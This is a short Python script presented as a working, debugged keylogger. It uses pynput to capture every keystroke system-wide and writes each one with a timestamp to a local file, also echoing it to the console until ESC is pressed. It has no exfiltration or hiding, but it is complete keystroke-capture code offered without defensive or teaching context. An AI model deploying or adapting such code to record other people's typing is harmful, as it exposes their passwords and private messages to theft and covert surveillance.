#!/usr/bin/env python3
"""
Working Keylogger Example - Debugged Version
"""

from pynput import keyboard
import datetime
import os

def on_press(key):
    """Handle key press events"""
    try:
        # Open file in append mode
        with open("keylog_example.txt", "a") as f:
            # Write timestamp
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle different key types
            if hasattr(key, 'char') and key.char is not None:
                # Regular character key
                f.write(f"[{timestamp}] {key.char}\n")
                print(f"Logged: {key.char}")  # Debug output
            else:
                # Special key
                f.write(f"[{timestamp}] [{key}]\n")
                print(f"Logged special key: {key}")  # Debug output
                
            f.flush()  # Force write to disk immediately
            
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        print("\nESC pressed - stopping keylogger...")
        return False  # Stop listener

def main():
    print("=== Keylogger Starting ===")
    print("Press ESC to stop")
    print("Logging to: keylog_example.txt")
    print("-" * 50)
    
    # Create/overwrite the log file with a header
    with open("keylog_example.txt", "w") as f:
        f.write("=== Keylogger Session Started ===\n")
        f.write(f"Time: {datetime.datetime.now()}\n")
        f.write("-" * 50 + "\n\n")
    
    try:
        # Create and start listener
        with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
            print("Listener started - type something...")
            listener.join()  # Wait for listener to finish
            
    except KeyboardInterrupt:
        print("\nStopped by Ctrl+C")
    except Exception as e:
        print(f"\nError in main loop: {e}")
    finally:
        print("\n=== Session Ended ===")
        print(f"Check 'keylog_example.txt' for captured keys")

if __name__ == "__main__":
    main()